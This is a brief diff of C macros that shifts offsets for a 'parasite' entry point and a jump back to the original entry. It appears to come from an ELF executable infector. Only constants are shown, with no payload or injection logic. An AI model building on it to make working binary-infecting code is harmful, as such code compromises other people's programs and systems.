@@ -5,11 +5,11 @@
 
 #define PARASITE_SIZE ((uint64_t)parasite_end - (uint64_t)parasite)
 
-#define PARASITE_ENTRY (0x51)
+#define PARASITE_ENTRY (0x11e)
 #define PARA_LEN ((PARASITE_ENTRY) + 8)
 #define TEXT_OFF ((PARASITE_ENTRY) + 20)
 #define TEXT_LEN ((PARASITE_ENTRY) + 25)
-#define JUMP_OLD ((PARASITE_ENTRY) + 80)
+#define JUMP_OLD ((PARASITE_ENTRY) + 84)
 
 char *parasite_buf;
 
